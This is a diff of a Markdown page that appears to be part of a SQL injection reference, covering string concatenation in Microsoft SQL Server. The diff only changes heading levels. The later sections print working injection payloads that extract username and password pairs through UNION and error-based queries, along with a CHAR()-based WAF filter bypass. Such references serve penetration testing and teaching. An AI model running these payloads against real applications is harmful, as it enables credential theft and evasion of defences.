@@ -7,11 +7,9 @@ tags: ["string operations", "concatenation", "T-SQL"]
 lastUpdated: 2025-03-15
 ---
 
-## String Concatenation
-
 String concatenation is an essential technique for SQL injection in Microsoft SQL Server, allowing attackers to construct complex queries and bypass security filters. MSSQL provides several methods for concatenating strings.
 
-### Using the + Operator
+## Using the + Operator
 
 The most common method for string concatenation in SQL Server is the `+` operator:
 
@@ -26,7 +24,7 @@ SELECT 'a' + NULL + 'c';  -- Returns: NULL
 SELECT 'a' + ISNULL(NULL, '') + 'c';  -- Returns: 'ac'
 ```
 
-### Using CONCAT() Function (SQL Server 2012+)
+## Using CONCAT() Function (SQL Server 2012+)
 
 The `CONCAT()` function handles NULL values automatically:
 
@@ -35,7 +33,7 @@ SELECT CONCAT('a', 'b', 'c');  -- Returns: 'abc'
 SELECT CONCAT('a', NULL, 'c');  -- Returns: 'ac'
 ```
 
-### Using CONCAT_WS() Function (SQL Server 2017+)
+## Using CONCAT_WS() Function (SQL Server 2017+)
 
 `CONCAT_WS()` (Concatenate With Separator) joins strings with a specified separator:
 
@@ -44,7 +42,7 @@ SELECT CONCAT_WS(',', 'a', 'b', 'c');  -- Returns: 'a,b,c'
 SELECT CONCAT_WS(',', 'a', NULL, 'c');  -- Returns: 'a,c'
 ```
 
-### Using STRING_AGG() Function (SQL Server 2017+)
+## Using STRING_AGG() Function (SQL Server 2017+)
 
 For aggregating multiple rows into a single string:
 
@@ -53,7 +51,7 @@ SELECT STRING_AGG(name, ',') FROM sys.databases;
 -- Returns: 'master,tempdb,model,msdb,...'
 ```
 
-### Using FOR XML PATH (SQL Server 2005+)
+## Using FOR XML PATH (SQL Server 2005+)
 
 Before STRING_AGG, this was the common method for aggregating strings:
 
@@ -65,9 +63,9 @@ SELECT STUFF((
 ), 1, 1, '');
 ```
 
-### Practical SQL Injection Examples
+## Practical SQL Injection Examples
 
-#### Building Dynamic Queries
+### Building Dynamic Queries
 
 ```sql
 -- Creating a dynamic query string
@@ -76,30 +74,30 @@ SET @sql = 'SELECT * FROM ' + 'users' + ' WHERE id = ' + '1'
 EXEC(@sql)
 ```
 
-#### Data Extraction with Concatenation
+### Data Extraction with Concatenation
 
 ```sql
 -- UNION attack with concatenated output
 ' UNION SELECT NULL, (SELECT username + ':' + password FROM users FOR XML PATH('')), NULL--
 ```
 
-#### Error-based Extraction
+### Error-based Extraction
 
 ```sql
 -- Error-based extraction using concatenation
 ' AND 1=CONVERT(int, (SELECT TOP 1 username + ':' + password FROM users))--
 ```
 
-#### Concatenating Multiple Columns
+### Concatenating Multiple Columns
 
 ```sql
 -- Combining multiple columns into one string
 ' UNION SELECT NULL, firstname + ' ' + lastname + ' (' + email + ')', NULL FROM users--
 ```
 
-### Advanced Concatenation Techniques
+## Advanced Concatenation Techniques
 
-#### Type Conversion in Concatenation
+### Type Conversion in Concatenation
 
 When concatenating non-string data types, explicit conversion is recommended:
 
@@ -111,7 +109,7 @@ SELECT 'User ID: ' + CAST(user_id AS nvarchar(10)) FROM users
 SELECT CONCAT('User ID: ', user_id) FROM users
 ```
 
-#### Character Building
+### Character Building
 
 Building strings character by character using ASCII values:
 
@@ -119,7 +117,7 @@ Building strings character by character using ASCII values:
 SELECT CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)  -- Returns: 'admin'
 ```
 
-#### Nested Concatenation
+### Nested Concatenation
 
 Using nested concatenation for complex strings:
 
@@ -127,7 +125,7 @@ Using nested concatenation for complex strings:
 SELECT 'SELECT * FROM ' + (SELECT DB_NAME()) + '.' + 'users'
 ```
 
-#### Unicode Considerations
+### Unicode Considerations
 
 For internationalization, use N prefix and NCHAR():
 
@@ -135,7 +133,7 @@ For internationalization, use N prefix and NCHAR():
 SELECT N'Unicode: ' + NCHAR(9731)  -- Returns: 'Unicode: ☃'
 ```
 
-### Handling NULL Values
+## Handling NULL Values
 
 NULL handling is critical in string concatenation:
 
@@ -150,9 +148,9 @@ SELECT COALESCE(first_name, middle_name, last_name, 'Unknown') FROM users
 SELECT 'Username: ' + ISNULL(NULLIF(username, ''), 'Not Provided') FROM users
 ```
 
-### Concatenation in SQL Injection Attacks
+## Concatenation in SQL Injection Attacks
 
-#### Bypassing WAF Filters
+### Bypassing WAF Filters
 
 ```sql
 -- Breaking up keywords
@@ -165,7 +163,7 @@ SET @cmd = CHAR(115) + CHAR(101) + CHAR(108) + CHAR(101) + CHAR(99) + CHAR(116) 
 EXEC(@cmd)
 ```
 
-#### Extracting Multiple Values
+### Extracting Multiple Values
 
 ```sql
 -- Combining multiple rows into one result using STRING_AGG
@@ -175,7 +173,7 @@ EXEC(@cmd)
 ' UNION SELECT NULL, (SELECT username + ':' + password + ',' FROM users FOR XML PATH('')), NULL--
 ```
 
-### Limitations and Considerations
+## Limitations and Considerations
 
 1. Maximum string length in SQL Server is 8000 bytes for varchar, 4000 characters for nvarchar
 2. Performance degrades with very large string operations
